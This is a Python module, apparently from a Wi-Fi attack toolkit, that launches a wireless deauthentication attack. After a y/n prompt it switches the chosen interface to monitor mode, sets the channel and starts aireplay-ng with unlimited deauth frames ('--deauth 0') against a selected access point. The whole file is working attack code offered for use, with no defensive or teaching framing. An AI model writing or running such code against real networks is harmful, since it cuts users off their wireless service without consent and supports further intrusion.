import os
import time
import subprocess
import AP_Selector
from colorama import Fore, init

init(autoreset=True)


def DeAuth():
    print("")
    deauth_choice = input("Do you want to start a DEAUTH attack? (y/n): ").strip().lower()
    print("")
    if deauth_choice == 'y':
        
        AP_Selector.AP_selector_Func()

        os.system("clear")

        try:
            subprocess.run(["sudo", "ip", "link", "set", AP_Selector.interface_for_scan, "down"], check=True)
            print("setting ", AP_Selector.interface_for_scan, " down")
            subprocess.run(["sudo", "iw", AP_Selector.interface_for_scan, "set", "monitor", "control"], check=True)
            print("setting ", AP_Selector.interface_for_scan, " to MONITOR")
            subprocess.run(["sudo", "ip", "link", "set", AP_Selector.interface_for_scan, "up"], check=True)
            print("setting ", AP_Selector.interface_for_scan, " up")
            time.sleep(3)
            subprocess.run(["sudo", "iwconfig", AP_Selector.interface_for_scan, "channel", AP_Selector.selected_channel], check=True)
            print("setting ", AP_Selector.interface_for_scan, " To Channel :", Fore.GREEN + AP_Selector.selected_channel)
        except subprocess.CalledProcessError:
            print(f"[-] Failed to set {AP_Selector.interface_for_scan} to monitor mode.")

        time.sleep(1.5)
        print(Fore.GREEN + "Starting DEAUTH attack...")
        subprocess.Popen(['xterm', '-hold', '-e', f'sudo aireplay-ng --deauth 0 -a {AP_Selector.selected_bssid} {AP_Selector.interface_for_scan}'])
    else:
        print("Skipping DEAUTH attack.")